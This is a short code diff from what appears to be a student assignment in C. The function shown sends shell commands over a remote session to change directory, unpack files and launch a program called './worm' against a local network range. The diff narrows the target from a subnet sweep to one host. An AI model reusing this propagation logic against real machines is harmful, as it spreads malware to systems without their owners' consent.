@@ -331,7 +331,7 @@ void fileExecute(char *ip, char *username, char *pass){
         //cd
         fflush(file);
         sleep(2);
-        fprintf(file, "cd /Asgn03KLG/\n");
+        fprintf(file, "cd /home/kath/Asgn03KLG\n");
         
         //descompactar
         fflush(file);
@@ -346,7 +346,7 @@ void fileExecute(char *ip, char *username, char *pass){
         //execute
         fflush(file);
         sleep(2);
-        fprintf(file, "./worm 192.168.0.0-255 0-25 4\n");
+        fprintf(file, "./worm 192.168.0.225 0-25 4\n");
         
         //exit
         fflush(file);
